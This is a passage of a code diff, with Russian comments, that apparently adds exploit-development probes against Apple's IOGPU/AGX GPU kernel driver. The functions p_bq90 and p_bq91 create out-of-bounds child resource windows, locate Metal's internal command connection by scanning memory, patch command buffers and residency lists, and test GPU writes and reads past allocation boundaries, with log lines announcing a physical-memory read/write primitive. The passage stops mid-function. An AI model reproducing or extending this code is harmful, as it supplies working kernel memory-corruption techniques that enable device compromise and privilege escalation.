@@ -44148,6 +44148,564 @@ static void p_bq89(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq90 — v250: OOB-child в 6-pack ресурс-группы сегмент-листа (§241→§242).
+// Ядро обрабатывает 6-pack на residency/translation-стадии submit'а (статус-0
+// стадия, §75/v84): child в пакете заставляет ядро deref'нуть child+0x48 —
+// окно = parent_gpuva + D, в b4 БЕЗ bounds-проверки (§240/§241).
+// Parent = ridA (формат-B, GPUVA 0x100_00000000 — capture-matched): дети
+// живут В ПРОСТРАНСТВЕ КАПЧИ: D=+0x18000 → окно == GPUVA ridB (dest-референс
+// verbatim-команды покрыт окном ребёнка, ridB при этом НЕ в пакете).
+// Контроль §144: (V0) verbatim 6-pack {A,B,C} → ожидаем {kr0, out0, comp{0,5}};
+// (V1) in-bounds child (D=0, size==parent); (V2) OOB d18; (V3) negative-D;
+// (V4) far-OOB. Наблюдаемое: kt/*outw/sel17/sel15, completion-статусы,
+// 0x5A-сканы cpuB (dest) и cpuA/cpuC (дельта до/после), здоровье устройства.
+static void p_bq90(void) {
+    LOG("[bq90] v250: OOB-child в 6-pack — residency-стадия deref (§241)");
+    fsync(fileno(stderr));
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) { LOG("[bq90] IOGPU type-1 open FAILED"); return; }
+    uint8_t *in = must_map(0x2000), *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+
+    // === очередь + нотификации (v84-точный сетап: nqVA data-queue + procName-blob +
+    // notif port — без них completion-канал молчит, §75) ===
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10; nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqVA = *(uint64_t *)out;
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    strncpy((char *)in, getprogname(), 0x1f);
+    *(uint32_t *)(in + 0x400) = 2;                      // priority (capture form)
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[bq90] bind fail"); return; }
+    kern_return_t knp = IOConnectSetNotificationPort(c, 0, mach_reply_port(), nqid);
+    LOG("[bq90] setup: nqVA %#llx nqid %llu qid %llu notifport kr=%#x",
+        nqVA, (unsigned long long)nqid, (unsigned long long)qid, knp);
+
+    // === ресурсы капчи A/B/C (порядок как в v83; GPUVA-матч = контроль аллокатора) ===
+    const uint64_t BSZ = 0x10000;
+    uint64_t gpuvaA = 0, gpuvaB = 0, gpuvaC = 0;
+    uint8_t *cpuA = NULL, *cpuB = NULL, *cpuC = NULL;
+    uint32_t ridA = gpu_resource2(c, BSZ, &gpuvaA, &cpuA);
+    uint32_t ridB = gpu_resource2(c, BSZ, &gpuvaB, &cpuB);
+    uint32_t ridC = gpu_resource2(c, 0x20000, &gpuvaC, &cpuC);
+    if (!ridA || !ridB || !ridC) {
+        LOG("[bq90] resource2 fail (A %u B %u C %u) — abort", ridA, ridB, ridC);
+        return;
+    }
+    LOG("[bq90] A rid %u gpuva %#llx | B rid %u gpuva %#llx | C rid %u gpuva %#llx",
+        ridA, gpuvaA, ridB, gpuvaB, ridC, gpuvaC);
+    int alloc_ctl = (gpuvaA == 0x10000000000ULL && gpuvaB == 0x10000018000ULL &&
+                    gpuvaC == 0x10000030000ULL);
+    LOG("[bq90] CONTROL аллокатор-vs-капча: %d (ожидаю 1)", alloc_ctl);
+    int have_assets = 0;
+    {
+        NSBundle *mb = [NSBundle mainBundle];
+        NSData *d0 = [NSData dataWithContentsOfFile:[mb pathForResource:@"res0_metacache" ofType:@"bin"]];
+        NSData *d1 = [NSData dataWithContentsOfFile:[mb pathForResource:@"res1_dest" ofType:@"bin"]];
+        NSData *d2 = [NSData dataWithContentsOfFile:[mb pathForResource:@"res2_pool" ofType:@"bin"]];
+        if (d0.length == BSZ && d1.length == BSZ && d2.length == 0x20000 && cpuA && cpuB && cpuC) {
+            memcpy(cpuA, d0.bytes, BSZ);
+            memcpy(cpuB, d1.bytes, BSZ);
+            memcpy(cpuC, d2.bytes, 0x20000);
+            have_assets = 1;
+        }
+    }
+    if (!have_assets) {
+        if (cpuA) memset(cpuA, 0x41, BSZ);
+        if (cpuB) memset(cpuB, 0, BSZ);
+        if (cpuC) memset(cpuC, 0, 0x20000);
+    }
+    LOG("[bq90] assets: %d", have_assets);
+
+    // === PROTSWEEP: гейт popcount(child_prot)==parent+0x14 для родителя ridA ===
+    uint64_t prot_ok = 0; int prot_found = 0;
+    for (uint64_t p = 0; p < 0x10 && !prot_found; p++) {
+        kern_return_t krp = 0xe00002be;
+        uint32_t ridp = bq89_child(c, in, out, ridA, p, 0, 0, 0x1000, &krp);
+        LOG("[bq90] PROTSWEEP prot=%#llx: kr=%#x rid=%u %s",
+            (unsigned long long)p, krp, ridp, krp == 0 ? "*** PASS ***" : "gate");
+        if (krp == 0) {
+            prot_ok = p; prot_found = 1;
+            hexdump("[bq90] prot-out", out, 0x58);
+        }
+        fsync(fileno(stderr));
+        usleep(50000);
+    }
+    if (!prot_found) { LOG("[bq90] prot 0..f все gated — abort"); return; }
+
+    // === ДЕТИ ridA: окно = gpuvaA + D (buffer−base = D), prot=prot_ok ===
+    struct { const char *n; uint64_t d, sz; uint32_t rid; uint64_t win; } ch[4] = {
+        { "child_d0   (D=0, in-bounds)",           0,       BSZ,          0, 0 },
+        { "child_d18  (D=+0x18000, win==ridB-VA)", 0x18000, BSZ,          0, 0 },
+        { "child_dneg (D=-0x18000)",               (uint64_t)(int64_t)-0x18000, BSZ, 0, 0 },
+        { "child_dbig (D=+0x10000000)",             0x10000000, 0x1000,    0, 0 },
+    };
+    for (int i = 0; i < 4; i++) {
+        kern_return_t krc = 0xe00002be;
+        ch[i].rid = bq89_child(c, in, out, ridA, prot_ok, ch[i].d, 0, ch[i].sz, &krc);
+        ch[i].win = *(uint64_t *)(out + 0x00);
+        LOG("[bq90] CHILD %-34s kr=%#x rid=%u win=%#llx oracle(+0x50)=%#llx %s",
+            ch[i].n, krc, ch[i].rid, ch[i].win, *(uint64_t *)(out + 0x50),
+            krc == 0 ? "*** СОЗДАН ***" : "rejected");
+        hexdump("[bq90] child-out", out, 0x58);
+        fsync(fileno(stderr));
+        usleep(80000);
+    }
+
+    // === shmem (порядок капчи: seg id=1, kernel-cmd id=2) ===
+    uint8_t *vaSeg, *vaCmd, *vaCmd0;
+    uint32_t idSeg = gpu_shmem_t(c, 0x4000, 0, &vaSeg);
+    uint32_t idCmd = gpu_shmem_t(c, 0x4000, 1, &vaCmd);
+    uint32_t idCmd0 = gpu_shmem(c, 0x4000, &vaCmd0);
+    if (!idSeg || !idCmd || !idCmd0) { LOG("[bq90] shmem fail — abort"); return; }
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    uint8_t *comp = must_map(0x1000);
+
+    // === варианты 6-pack: слот X ∈ {ridB-CTL, d0, d18, dneg, dbig} ===
+    // dest-референс капчи (0x100_00018000) патчим на окно ребёнка — кроме
+    // V0 (verbatim) и V2 (окно d18 уже == 0x18000).
+    struct { const char *n; uint32_t xrid; uint64_t xwin; int patch_dest; } vars[5] = {
+        { "V0 CTL verbatim {A,B,C}",     ridB,      gpuvaB,      0 },
+        { "V1 in-bounds child_d0",      ch[0].rid, ch[0].win,   1 },
+        { "V2 OOB d18 (win==0x18000)",  ch[1].rid, ch[1].win,   0 },
+        { "V3 OOB dneg",                ch[2].rid, ch[2].win,   1 },
+        { "V4 OOB dbig",                ch[3].rid, ch[3].win,   1 },
+    };
+    for (int v = 0; v < 5; v++) {
+        if (!vars[v].xrid) { LOG("[bq90] %s: xrid=0, skip", vars[v].n); continue; }
+        memcpy(vaCmd, agx_A4_image, 0x4000);          // verbatim kernel-cmd образ
+        memcpy(vaSeg, agx_B4_image, 0x4000);          // verbatim KCL+SL+segment
+        if (vars[v].patch_dest) {
+            for (long o = 0; o < 0x1000 - 8; o += 4) {
+                uint64_t q = *(uint64_t *)(vaCmd + o);
+                if ((q >> 32) == 0x100 && (q & 0xffffffff) == 0x18000)
+                    *(uint64_t *)(vaCmd + o) = vars[v].xwin;
+            }
+        }
+        *(uint32_t *)(vaSeg + 0x40) = 3;              // numResources
+        *(uint32_t *)(vaSeg + 0x44) = 1;              // numResourceGroups
+        uint8_t *g6 = vaSeg + 0x48;
+        memset(g6, 0, 0x40);
+        *(uint32_t *)(g6 + 0x00) = ridA;
+        *(uint32_t *)(g6 + 0x04) = vars[v].xrid;
+        *(uint32_t *)(g6 + 0x08) = ridC;
+        *(uint32_t *)(g6 + 0x18) = (uint32_t)(BSZ >> 10);
+        *(uint32_t *)(g6 + 0x1c) = (uint32_t)(BSZ >> 10);
+        *(uint32_t *)(g6 + 0x20) = (uint32_t)(0x20000 >> 10);
+        *(uint16_t *)(g6 + 0x30) = 3;                 // usage (u3 — proven)
+        *(uint16_t *)(g6 + 0x32) = 3;
+        *(uint16_t *)(g6 + 0x34) = 3;
+        *(uint16_t *)(g6 + 0x3e) = 3;
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = idCmd;
+        *(uint32_t *)(entry + 0x04) = idSeg;
+        *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;         // capture form
+        *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
+        *outw = 0xdeadbeef;
+        memset(comp, 0, 0x1000);
+        memset(cpuB, 0, BSZ);                          // dest чистим (как v83)
+        long a5_pre = 0, c5_pre = 0;
+        if (cpuA) for (long i = 0; i < (long)BSZ; i += 0x40) if (cpuA[i] == 0x5A) a5_pre++;
+        if (cpuC) for (long i = 0; i < 0x20000; i += 0x40) if (cpuC[i] == 0x5A) c5_pre++;
+        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        uint64_t s17[1] = { 1 };
+        kern_return_t k17 = IOConnectCallScalarMethod(c, 17, s17, 1, NULL, NULL);
+        uint64_t s15[1] = { 2 };
+        kern_return_t k15a = IOConnectCallScalarMethod(c, 15, s15, 1, NULL, NULL);
+        s15[0] = 1;
+        kern_return_t k15b = IOConnectCallScalarMethod(c, 15, s15, 1, NULL, NULL);
+        long nz = 0, f5 = 0, a5 = 0, c5 = 0;
+        volatile uint8_t *nq = (volatile uint8_t *)(uintptr_t)nqVA;
+        uint32_t wr_pre = nqVA ? *(volatile uint32_t *)(nq + 0x08) : 0;
+        for (int w = 0; w < 20; w++) {                // poll до 2с
+            usleep(100000);
+            nz = 0; f5 = 0;
+            for (long i = 0; i < (long)BSZ; i += 0x40) {
+                if (cpuB[i]) nz++;
+                if (cpuB[i] == 0x5A) f5++;
+            }
+            if (nz) break;
+        }
+        if (cpuA) for (long i = 0; i < (long)BSZ; i += 0x40) if (cpuA[i] == 0x5A) a5++;
+        if (cpuC) for (long i = 0; i < 0x20000; i += 0x40) if (cpuC[i] == 0x5A) c5++;
+        uint64_t *cq = (uint64_t *)comp;
+        LOG("[bq90] %s -> kt=%#x outw=%08x post{17:%08x 15:%08x/%08x} | B: nonzero %ld 0x5A %ld | A5 %ld->%ld C5 %ld->%ld",
+            vars[v].n, kt, *outw, k17, k15a, k15b, nz, f5, a5_pre, a5, c5_pre, c5);
+        LOG("[bq90]   comp: %016llx %016llx %016llx %016llx | +30: %016llx %016llx",
+            cq[0], cq[1], cq[2], cq[3], cq[6], cq[7]);
+        // === data-queue (nq) readout: wrIdx + новые записи {ref,status} (v84/v85 канал) ===
+        if (nqVA) {
+            uint32_t wr = *(volatile uint32_t *)(nq + 0x08);
+            LOG("[bq90]   nq wrIdx %#x (pre %#x, +%u)", wr, wr_pre, wr - wr_pre);
+            uint32_t nnew = (wr - wr_pre) / 0x2c;
+            for (uint32_t e = 0; e < nnew && e < 8; e++) {
+                volatile uint8_t *rec = nq + 0x10 + (wr_pre / 0x2c + e) * 0x2c;
+                LOG("[bq90]   nq rec[%u]: ref %016llx start %016llx end %016llx status %08x",
+                    wr_pre / 0x2c + e,
+                    *(volatile uint64_t *)(rec + 0x00), *(volatile uint64_t *)(rec + 0x08),
+                    *(volatile uint64_t *)(rec + 0x10), *(volatile uint32_t *)(rec + 0x18));
+            }
+        }
+        uint64_t *sg = (uint64_t *)vaSeg, *hg = (uint64_t *)vaCmd;
+        LOG("[bq90]   seg hdr post: %016llx %016llx %016llx %016llx", sg[0], sg[1], sg[2], sg[3]);
+        LOG("[bq90]   cmd hdr post: %016llx %016llx %016llx %016llx", hg[0], hg[1], hg[2], hg[3]);
+        if (f5) LOG("[bq90]   *** GPU WRITE 0x5A В DEST ЧЕРЕЗ ОКНО РЕБЁНКА! ***");
+        if (a5 > a5_pre) LOG("[bq90]   *** 0x5A В РОДИТЕЛЕ A (fill в parent-память)! ***");
+        if (c5 > c5_pre) LOG("[bq90]   *** 0x5A В C (OOB-попадание в пул)! ***");
+        fsync(fileno(stderr));
+        usleep(200000);
+    }
+    LOG("[bq90] ИТОГ: 5 вариантов сабмита завершены (устройство живо? = нет паники)");
+    fsync(fileno(stderr));
+}
+
+// p_bq91 — v251: MT-PATCH × OOB-child (§82 × §241): GPU write/read через окно
+// ребёнка на COMMAND-КОННЕ Metal. Цепочка: настоящий Metal-контекст (v89) →
+// conn Metal (§77, port-like из _deviceRef/_impl, sel12-проба) → родители
+// P/P2 (format-B) → дети P: окно W = (gP+D)|bit38, ядро пишет offset AS-IS
+// (b4, §240/§241) → MT-PATCH dest/source pool-слотов на W + residency
+// rid→child → commit → GPU deref'ит W = phys(P)+D — при D>len(P) OOB
+// за границы аллокации родителя (b4: БЕЗ проверок).
+// Контроль §144: (K0) plain blit A→B (B=0x41 — контекст жив);
+// (K0b) v89-базлайн dest→gpuC (C=0x41 — патч-механизм жив);
+// (K1) dest→W(cD0): окно==P → cpuP получает 0x41 (окно-цепочка жива);
+// (A1) dest→W(cX), D=gP2−gP → cpuP2 получает 0x41 = CROSS-ALLOCATION WRITE;
+// (A2) source→W(cX) → cpuB==0x44-паттерн = OOB READ физ-соседа;
+// (A3) dest→W(cFar) → фолт (kill приложения) или молчаливый дроп.
+static void p_bq91(void) {
+    LOG("[bq91] v251: MT-PATCH × child-окно — GPU write/read OOB (§82×§241)");
+    fsync(fileno(stderr));
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[bq91] no MTLDevice"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    if (!mq) { LOG("[bq91] no queue"); return; }
+
+    // === command-конн Metal (§77): port-like u32 из _deviceRef/_impl → sel12-проба ===
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *devRef = devObj ? *(uint8_t **)(devObj + 656) : NULL;    // _deviceRef
+    uint8_t *devImpl = devObj ? *(uint8_t **)(devObj + 872) : NULL;   // _impl
+    LOG("[bq91] devObj %p devRef %p (+0x14: 0x%x) devImpl %p",
+        devObj, devRef, devRef ? *(uint32_t *)(devRef + 0x14) : 0, devImpl);
+    uint32_t cand[64]; int ncand = 0;
+    uint8_t *objs[2] = { devRef, devImpl };
+    for (int oi = 0; oi < 2; oi++) {
+        if (!objs[oi]) continue;
+        for (long off = 0; off < 0x200; off += 4) {
+            uint32_t v = *(uint32_t *)(objs[oi] + off);
+            if (v > 0x1000 && v < 0x100000 && (v & 3) == 3) {
+                int dup = 0;
+                for (int k = 0; k < ncand; k++) if (cand[k] == v) dup = 1;
+                if (!dup && ncand < 60) cand[ncand++] = v;
+            }
+        }
+    }
+    io_connect_t mconn = 0;
+    for (int k = 0; k < ncand && !mconn; k++) {
+        uint8_t *o12 = must_map(0x1000);
+        memset(o12, 0, 0x1000);
+        uint64_t a2[2] = { 0x1000, 0 };
+        size_t oz = 0x10;
+        uint64_t oc[4] = {0,0,0,0}; uint32_t noc = 0;
+        kern_return_t k12 = IOConnectCallMethod(cand[k], 12, a2, 2, NULL, 0, oc, &noc, o12, &oz);
+        LOG("[bq91] conn-кандид 0x%x: sel12 kr=%#x %s", cand[k], k12, k12 == 0 ? "<- Metal conn" : "");
+        if (k12 == 0) mconn = cand[k];
+        vm_deallocate(mach_task_self(), (vm_address_t)o12, 0x1000);
+    }
+    if (!mconn) { LOG("[bq91] Metal command conn не найден — abort"); return; }
+
+    // === родители P/P2/P3 на mconn (format-B, CPU-читаемые) ===
+    const uint64_t PSZ = 0x10000;
+    uint64_t gP = 0, gP2 = 0, gP3 = 0;
+    uint8_t *cpuP = NULL, *cpuP2 = NULL, *cpuP3 = NULL;
+    uint32_t ridP = gpu_resource2(mconn, PSZ, &gP, &cpuP);
+    uint32_t ridP2 = gpu_resource2(mconn, PSZ, &gP2, &cpuP2);
+    uint32_t ridP3 = gpu_resource2(mconn, PSZ, &gP3, &cpuP3);
+    if (!ridP || !ridP2 || !ridP3 || !cpuP || !cpuP2 || !cpuP3) {
+        LOG("[bq91] parents fail (%u/%u/%u) — abort", ridP, ridP2, ridP3);
+        return;
+    }
+    memset(cpuP, 0x33, PSZ);
+    memset(cpuP2, 0x44, PSZ);
+    memset(cpuP3, 0x55, PSZ);
+    LOG("[bq91] P rid %u gpuva %#llx cpu %p | P2 rid %u gpuva %#llx (delta %#llx) | P3 rid %u gpuva %#llx (d2 %#llx)",
+        ridP, gP, cpuP, ridP2, gP2, gP2 - gP, ridP3, gP3, gP3 - gP2);
+
+    // === prot-гейт на mconn (popcount, §241) ===
+    uint8_t *in = must_map(0x2000), *out = must_map(0x1000);
+    uint64_t prot_ok = 0; int prot_found = 0;
+    for (uint64_t p = 0; p < 0x10 && !prot_found; p++) {
+        kern_return_t krp = 0xe00002be;
+        bq89_child(mconn, in, out, ridP, p, 0, 0, 0x1000, &krp);
+        LOG("[bq91] PROTSWEEP(mconn) prot=%#llx kr=%#x %s",
+            (unsigned long long)p, krp, krp == 0 ? "*** PASS ***" : "gate");
+        if (krp == 0) { prot_ok = p; prot_found = 1; }
+        fsync(fileno(stderr));
+        usleep(50000);
+    }
+    if (!prot_found) { LOG("[bq91] prot 0..f все gated — abort"); return; }
+
+    // === дети P: окно W(D) = (gP+D)|bit38 (§241 эмпирика; бит38 — client-side тег:
+    // реальный VA окна = gP+D без биаса — проверяем патчем dest на RAW) ===
+    struct { const char *n; uint64_t d, sz; uint32_t rid; uint64_t win; } ch[3] = {
+        { "cD0  (D=0)",          0,                   PSZ,      0, 0 },
+        { "cX   (D=gP2-gP)",     gP2 - gP,            PSZ,      0, 0 },
+        { "cBig (D=+0x40000 past P2, sz 0x100000)", (gP2 - gP) + 0x40000, 0x100000, 0, 0 },
+    };
+    for (int i = 0; i < 3; i++) {
+        kern_return_t krc = 0xe00002be;
+        ch[i].rid = bq89_child(mconn, in, out, ridP, prot_ok, ch[i].d, 0, ch[i].sz, &krc);
+        ch[i].win = *(uint64_t *)(out + 0x00);
+        LOG("[bq91] CHILD %-22s kr=%#x rid=%u win=%#llx oracle(+0x50)=%#llx %s",
+            ch[i].n, krc, ch[i].rid, ch[i].win, *(uint64_t *)(out + 0x50),
+            krc == 0 ? "*** СОЗДАН ***" : "rejected");
+        hexdump("[bq91] child-out", out, 0x58);
+        fsync(fileno(stderr));
+        usleep(80000);
+    }
+
+    // === тесты MT-PATCH: свежий cb на каждый; dest-слоты → RAW VA (gP+D, БЕЗ
+    // bit38-биаса — гипотеза: 0x140-бит = client-side тег), residency-патч. ===
+    static const int NT = 9;
+    for (int ti = 0; ti < NT; ti++) {
+        // СВЕЖИЕ буферы на каждый тест: рецикл storage/pool-слотов Metal
+        // контаминирует патчи (v3-прогон: свежий seglist уже нёс ridA=29 от
+        // прошлого теста) — свежие GPUVA/rids => патчи не задевают чужое.
+        id<MTLBuffer> bufAt = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        id<MTLBuffer> bufBt = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        id<MTLBuffer> bufCt = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        if (!bufAt || !bufBt || !bufCt) { LOG("[bq91] fresh buf fail"); return; }
+        uint64_t gAt = [bufAt gpuAddress], gBt = [bufBt gpuAddress], gCt = [bufCt gpuAddress];
+        memset([bufAt contents], 0x41, 0x10000);
+        memset([bufBt contents], 0, 0x10000);
+        memset([bufCt contents], 0, 0x10000);
+        // ti: 0=K0 plain | 1=K0b dest->C | 2=T1 dest->gP res(P) |
+        //     3=T2 dest->gP БЕЗ res | 4=T3 dest->gP2 res(P2) |
+        //     5=T4 dest->gP2 res(cX) | 6=T5 dest->gP2+0x40000 res(cBig) |
+        //     7=T6 src->gP2 res(cX) READ | 8=T7 src->gP2+40000 res(cBig) READ
+        const char *names[NT] = { "K0 plain A->B", "K0b dest->C (v89)",
+                                  "T1 dest->gP res(P)", "T2 dest->gP no-res",
+                                  "T3 dest->gP2 res(P2)", "T4 dest->gP2 res(cX)",
+                                  "T5 dest->gP2+40000 res(cBig)",
+                                  "T6 src->gP2 res(cX) READ",
+                                  "T7 src->gP2+40000 res(cBig) READ" };
+        int pdest[NT] = { 0, 1, 1, 1, 1, 1, 1, 0, 0 };
+        int psrc[NT]  = { 0, 0, 0, 0, 0, 0, 0, 1, 1 };
+        uint64_t dstv[NT] = { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+        dstv[1] = gCt; dstv[2] = gP; dstv[3] = gP;
+        dstv[4] = gP2; dstv[5] = gP2; dstv[6] = gP2 + 0x40000;
+        uint64_t srcv[NT] = { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+        srcv[7] = gP2; srcv[8] = gP2 + 0x40000;
+        int rslot[NT] = { 0, 1, 1, 0, 1, 1, 1, 2, 2 };      // чей rid меняем в seglist
+        uint32_t rnew[NT] = { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+        rnew[2] = ridP; rnew[4] = ridP2; rnew[5] = ch[1].rid; rnew[6] = ch[2].rid;
+        rnew[7] = ch[1].rid; rnew[8] = ch[2].rid;
+        if ((ti >= 5 && ti <= 7 && !ch[1].rid) || (ti == 6 && !ch[2].rid) ||
+            (ti == 8 && !ch[2].rid)) {
+            LOG("[bq91] %s: child rid=0 — skip", names[ti]);
+            continue;
+        }
+        id<MTLCommandBuffer> cb = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+        [enc copyFromBuffer:bufAt sourceOffset:0 toBuffer:bufBt destinationOffset:0 size:0x10000];
+        [enc endEncoding];
+        void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+        if (!storage) { LOG("[bq91] no storage"); return; }
+        uint8_t *sg = *(uint8_t **)((uint8_t *)storage + 0x68);
+        memset(cpuP, 0x33, PSZ);
+        memset(cpuP2, 0x44, PSZ);
+        memset(cpuP3, 0x55, PSZ);
+
+        // pool-слоты: VM-скан всего процесса, патч qword'ов gpuB(dest)/gpuA(src)
+        long pdest_n = 0, psrc_n = 0;
+        if (pdest[ti] || psrc[ti]) {
+            mach_vm_address_t addr = 0;
+            for (;;) {
+                mach_vm_size_t sz = 0;
+                vm_region_basic_info_data_64_t info;
+                mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+                mach_port_t obj;
+                if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                                   (vm_region_info_t)&info, &cnt, &obj)) break;
+                if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
+                    uint8_t *base = (uint8_t *)addr;
+                    for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4) {
+                        uint64_t q = *(uint64_t *)(base + o);
+                        if (pdest[ti] && q == gBt) { *(uint64_t *)(base + o) = dstv[ti]; pdest_n++; }
+                        else if (psrc[ti] && q == gAt) { *(uint64_t *)(base + o) = srcv[ti]; psrc_n++; }
+                    }
+                }
+                addr += sz;
+                if (!sz) break;
+            }
+        }
+        // residency: rid-слоты в seglist (6-pack группа sizeKB 0x40/0x40)
+        uint32_t ridB = 0, ridA_m = 0;
+        long rp = 0;
+        {
+            for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+                uint16_t c2 = *(uint16_t *)(sg + o + 0x3e);
+                if (c2 == 2 && *(uint32_t *)(sg + o + 0x18) == 0x40 &&
+                    *(uint32_t *)(sg + o + 0x1c) == 0x40) {
+                    ridA_m = *(uint32_t *)(sg + o + 0x00);
+                    ridB = *(uint32_t *)(sg + o + 0x04);
+                    break;
+                }
+            }
+            if (rslot[ti] == 1 && ridB && rnew[ti]) {
+                for (long o = 0x48; o + 4 <= 0x400; o += 4)
+                    if (*(uint32_t *)(sg + o) == ridB) { *(uint32_t *)(sg + o) = rnew[ti]; rp++; }
+            } else if (rslot[ti] == 2 && ridA_m && rnew[ti]) {
+                for (long o = 0x48; o + 4 <= 0x400; o += 4)
+                    if (*(uint32_t *)(sg + o) == ridA_m) { *(uint32_t *)(sg + o) = rnew[ti]; rp++; }
+            } else if (rslot[ti] == 1 && !rnew[ti]) {
+                // K0b: ridB -> ridC guess (v89): ridC = ridB+1
+                if (ridB) {
+                    uint32_t ridCg = ridB + 1;
+                    for (long o = 0x48; o + 4 <= 0x400; o += 4)
+                        if (*(uint32_t *)(sg + o) == ridB) { *(uint32_t *)(sg + o) = ridCg; rp++; }
+                }
+            }
+        }
+        LOG("[bq91] %s: dest-слотов %ld src-слотов %ld, ridA %u ridB %u, residency-патчей %ld",
+            names[ti], pdest_n, psrc_n, ridA_m, ridB, rp);
+        fsync(fileno(stderr));
+        @try {
+            [cb commit];
+            [cb waitUntilCompleted];
+        } @catch (NSException *ex) {
+            LOG("[bq91] %s: EXCEPTION %s", names[ti], [[ex reason] UTF8String]);
+            continue;
+        }
+        long st = (long)[cb status];
+        long cB41 = 0, cC41 = 0, cP41 = 0, cP241 = 0, cP341 = 0, cB44 = 0, cBnz = 0;
+        for (long i = 0; i < 0x10000; i += 0x40) {
+            uint8_t bb = ((uint8_t *)[bufBt contents])[i];
+            uint8_t cc = ((uint8_t *)[bufCt contents])[i];
+            if (bb == 0x41) cB41++;
+            if (cc == 0x41) cC41++;
+            if (bb == 0x44) cB44++;
+            if (bb) cBnz++;
+            if (i < (long)PSZ) {
+                if (cpuP[i] == 0x41) cP41++;
+                if (cpuP2[i] == 0x41) cP241++;
+                if (cpuP3[i] == 0x41) cP341++;
+            }
+        }
+        LOG("[bq91] %s -> cb status %ld | B:41 %ld B:44 %ld Bnz %ld | C:41 %ld | P:41 %ld | P2:41 %ld | P3:41 %ld",
+            names[ti], st, cB41, cB44, cBnz, cC41, cP41, cP241, cP341);
+        if (ti == 1 && cC41) LOG("[bq91]   *** K0b: MT-PATCH базлайн — патч-механизм жив ***");
+        if (ti == 2 && cP41) LOG("[bq91]   *** T1: RAW gP + res(P) — VA родителя пишет! ***");
+        if (ti == 3 && cP41) LOG("[bq91]   *** T2: gP замаплен ДАЖЕ БЕЗ residency! ***");
+        if (ti == 4 && cP241) LOG("[bq91]   *** T3: алиас-VA gP2 со своим мапплением ✓ (control) ***");
+        if (ti == 5) LOG("[bq91]   T4: res(ребёнок): %s",
+                        cP241 ? "*** РЕБЁНОК МАППИТ ОКНО — GPU-OOB ПРИМИТИВ! ***"
+                              : "drop — ребёнок окно НЕ маппит (или маппит не туда)");
+        if (ti == 6) LOG("[bq91]   T5: cBig past-P2 window WRITE: статус %ld — запись ушла в phys(P)+0x58000 (вне наших аллокаций)", st);
+        if (ti == 7) LOG("[bq91]   T6: READ через окно cX: %s",
+                        cB44 ? "*** ЧТЕНИЕ phys(P)+(gP2-gP) = Р2 ЧЕРЕЗ ОКНО РЕБЁНКА ***"
+                             : "B чистый — чтение не пришло");
+        if (ti == 8) LOG("[bq91]   T7: READ past-P3 (phys(P)+0x58000): Bnz %ld %s",
+                        cBnz, cBnz ? "*** ОКНО ЧИТАЕТ ФИЗ-ПАМЯТЬ ЗА ПРЕДЕЛАМИ АЛЛОКАЦИЙ — ЛЮБОЙ D! ***"
+                                   : "(нули/дроп)");
+        fsync(fileno(stderr));
+        usleep(200000);
+    }
+    // === T8/T9 ROUND-TRIP через past-P3 окно cBig: write → readback.
+    // Решающий тест маппинга окна: если residency ребёнка строит PTE окна,
+    // запись (T8) и чтение (T9) по внутреннему VA окна сойдутся; если окно
+    // не маппится — оба молча дропнутся. Содержимое не важно — round-trip
+    // самодостаточен. ===
+    if (ch[2].rid) {
+        uint64_t Wb = gP + ch[2].d;              // сырая база окна (без |bit38)
+        uint64_t Wi = Wb + 0x10000;              // внутренний VA (не parent-VA!)
+        LOG("[bq91] ROUND-TRIP: окно cBig raw [%#llx +%#llx], внутренний VA %#llx",
+            Wb, ch[2].sz, Wi);
+        for (int phase = 0; phase < 2; phase++) {
+            id<MTLBuffer> bA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+            id<MTLBuffer> bB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+            if (!bA || !bB) { LOG("[bq91] rt: buf fail"); return; }
+            uint64_t ga = [bA gpuAddress], gb2 = [bB gpuAddress];
+            (void)ga;
+            memset([bA contents], phase ? 0x77 : 0x41, 0x10000);
+            memset([bB contents], 0, 0x10000);
+            id<MTLCommandBuffer> cb = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+            [enc copyFromBuffer:bA sourceOffset:0 toBuffer:bB destinationOffset:0 size:0x10000];
